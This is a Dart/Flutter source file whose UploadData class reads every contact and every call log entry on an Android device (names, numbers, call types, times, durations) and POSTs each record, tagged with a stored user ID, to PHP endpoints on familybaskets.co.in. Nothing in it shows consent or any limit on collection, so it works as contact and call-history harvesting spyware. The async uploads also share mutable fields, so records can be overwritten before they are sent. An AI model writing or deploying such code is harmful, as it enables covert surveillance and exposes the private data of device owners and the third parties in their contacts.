import 'package:call_log/call_log.dart';
import 'package:call_look/CallCode.dart';
import 'package:contacts_service/contacts_service.dart';
import 'package:http/http.dart' as http;
import 'package:shared_preferences/shared_preferences.dart';

class UploadData {
  final urlcalllog = "https://familybaskets.co.in/api/calllog.php";
  final urlcontact = "https://familybaskets.co.in/api/contact.php";
  CallCode callCode = new CallCode();
  var callname, callphone, callcalltype, callcallingtime, callduration, userid, contactname, contactphone;

  void getuserid()async{
    final prefs = await SharedPreferences.getInstance();
    userid = prefs.getString('userid');
    contact();
  }

  void contact() async {
    List<Contact> _contact = await ContactsService.getContacts(withThumbnails: false);
    for(int i=0;i< _contact.length; i++){
      contactname = _contact.elementAt(i).displayName;
      contactphone = '';
      for(int j=0; j<_contact.elementAt(i).phones.length; j++){
        contactphone += _contact.elementAt(i).phones.elementAt(j).value + "\n";
      }
      uploadcontact();
    }
    calllog();
  }
  void uploadcontact() async {
    final response = await http.post(Uri.parse(urlcontact),
        body: {
          "name" : contactname,
          "phone" : contactphone,
          "userid" : userid
        });
    print(response.body);
  }

  void calllog() async {
    final List<CallLogEntry> calllogs = (await CallLog.get()).toList();
    for(int i=0; i<calllogs.length; i++){
      callname = callCode.getName(calllogs[i]);
      // callCode.getName(elementAt(index));
      callphone = calllogs.elementAt(i).number;
      // entries.elementAt(index).number;
      callcalltype = callCode.calltypes(calllogs[i].callType);
      // callCode.calltypes(entries.elementAt(index).callType);
      callcallingtime = callCode.formatdate(new DateTime.fromMillisecondsSinceEpoch(
          calllogs.elementAt(i).timestamp));
      // callCode.formatdate(new DateTime.fromMillisecondsSinceEpoch(entries.elementAt(index).timestamp));
      callduration = callCode.printDuration(calllogs.elementAt(i).duration);
      // callCode.printDuration(entries.elementAt(index).duration);

      uploadcalllogs();
    }
  }
  void uploadcalllogs() async {
    final response = await http.post(Uri.parse(urlcalllog), body: {
      "name": callname,
      "phone": callphone,
      "calltype": callcalltype,
      "callingtime": callcallingtime,
      "duration": callduration,
      "userid": userid
    });

    print(response.body);
  }
}
